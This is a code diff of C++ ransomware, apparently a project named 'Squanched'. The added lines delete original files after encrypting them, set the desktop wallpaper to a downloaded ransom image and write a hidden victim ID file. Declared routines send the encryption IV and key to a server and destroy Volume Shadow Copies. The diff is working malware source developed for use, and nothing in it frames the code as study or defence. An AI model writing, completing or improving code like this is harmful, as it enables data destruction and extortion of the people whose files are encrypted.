@@ -3,6 +3,7 @@
 #include <stdexcept>
 #define LIMIT_CPU_FAIL 0
 
+#define VM 1
 #if 1
 using namespace boost::filesystem;
 using std::string;
@@ -19,7 +20,7 @@ Status sendIVAndKeyToServer(PBYTE masterIV, PBYTE masterKey, PBYTE id);
 void changeHiddenFileState(bool state);
 void destroyVSS();
 
-Status changeWallPaper();
+Status changeWallPaper(const string&);
 Status LimitCPU(HANDLE& hCurrentProcess, HANDLE& hJob);
 void doRestart();
 void makeFileHidden(string path);
@@ -30,17 +31,15 @@ int main(int argc, char* argv[]) {
 	
 	PBYTE masterIV = nullptr, masterKey = nullptr;
 	string path = ROOT_DIR;
-	string pathToImage = get_home() + R"(\squanched.jpg)";
+	string pathToImage = get_path_to_jpeg();
 #if VM
 	RegisterProgram();
 #endif
 	changeHiddenFileState(false);
 	download_jpeg(pathToImage, R"(https://i.redd.it/ep77fc6dceey.jpg)");
 	makeFileHidden(pathToImage);
-	string pathToID = get_home() + R"(\SquanchedID.id)";
-#if VM
-	changeWallPaper();
-#endif
+	string pathToID = get_path_to_id();
+
 	//TODO set SquanchedID and IMAGE invisible
 	std::ofstream IDFile;
 	PBYTE id = nullptr;
@@ -88,10 +87,15 @@ int main(int argc, char* argv[]) {
 	
 	
 	IDFile.open(pathToID, std::ios::binary);
+	if(!IDFile.is_open())
+	{
+		std::cout << "Failed to open file: " << GetLastError() << std::endl;
+	}
 	IDFile.write((char*)id, ID_LEN);
+	IDFile.close();
 	makeFileHidden(pathToID);
 
-	IDFile.close();
+	
 
 	changeHiddenFileState(true);
 	
@@ -101,6 +105,10 @@ int main(int argc, char* argv[]) {
 
 //	encrypt(path, masterIV, masterKey);
 	iterate2(path, &encrypt, masterIV, masterKey, processed);
+	for(auto& path : processed)
+	{
+		remove(path);
+	}
 
 //#ifdef DEBUG
 //	std::cout << "Username: " << get_username() << std::endl;
@@ -113,6 +121,9 @@ int main(int argc, char* argv[]) {
 //
 //	notify();
 //
+#if VM
+	changeWallPaper(pathToImage);//TODO move to notify
+#endif
 
 CLEAN:
 	if (masterKey)
@@ -424,9 +435,10 @@ Status LimitCPU(HANDLE& hCurrentProcess, HANDLE& hJob)
 	return status;
 }
 
-Status changeWallPaper()
+Status changeWallPaper(const string& path)
 {
-	int return_value = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, R"()", SPIF_UPDATEINIFILE);
+	PVOID str = (PVOID)path.c_str();
+	int return_value = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE);
 	if(!return_value)
 	{
 		return STATUS_UNSUCCESSFUL;
